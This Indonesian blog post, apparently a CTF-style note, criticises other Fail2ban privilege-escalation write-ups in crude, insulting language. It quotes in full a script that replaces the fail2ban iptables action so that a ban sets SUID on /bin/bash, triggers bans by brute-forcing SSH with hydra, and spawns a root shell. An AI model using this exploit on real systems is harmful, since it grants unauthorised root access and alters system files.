---
layout: post
title: 'Note: Fail2ban PrivEsc'
date: 2022-12-28
---

Nyari sana sini ternyata beberapa blog ini, tidak berguna.

* [Author: Youssef Ichioui](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)
* [Title: The Cyber Security Library](https://oklencodes.gitbook.io/untitled/ctfs/biteme-ctf/fail2ban-privilege-escalation)
* [Author: JAY BHATT](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)
* [Author: rvizx](https://github.com/rvizx/fail2ban)

Bukan untuk menghina atau apa, tetapi saya mencoba semua metode itu yang memang kesannya `plagiarism` tetap tidak bisa ditolerir dan metode mereka semua sampah.
> Yaelah, kayanya lu aja yang lupa ngecek versinya

Matamu tak picek kene.
> Mungkin lu ga liat konfigurasinya aja bro, blablab

Raimu tak geplak kene, asu.

### Analyzing code of Rvizx's script
```sh
#!/usr/bin/bash

# title : fail2ban-privesc
# author : Ravindu Wickramasinghe (@rvizx9)


echo '
+==============================+
|  fail2ban-privesc | @rvizx9  |
+==============================+

'

conf="
[INCLUDES]
before = iptables-common.conf
[Definition]

actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
actionban = chmod 4755 /bin/bash
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
[Init]
"

rm -rf /etc/fail2ban/action.d/iptables-multiport.conf
echo "$conf" > iptables-multiport.conf
mv iptables-multiport.conf /etc/fail2ban/action.d/
sudo /etc/init.d/fail2ban restart
ip -br -c a

echo "[!] start to bruteforce ssh login."
echo "[run] @attacker : hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh"
echo "[!] bash -p will be executed in 100s"
sleep 100
bash -p
```
Saya jelaskan dulu bagaimana kode ini bekerja dan membuat muak hidup saya hingga 1 jam untuk melihat bahwasanya ini adalah hal konyol. Saya tidak menggunakan script ini untuk dieksekusi, tetapi saya menggunakan ini sebagai shortcut untuk melihat apakah pasti atau tidak.
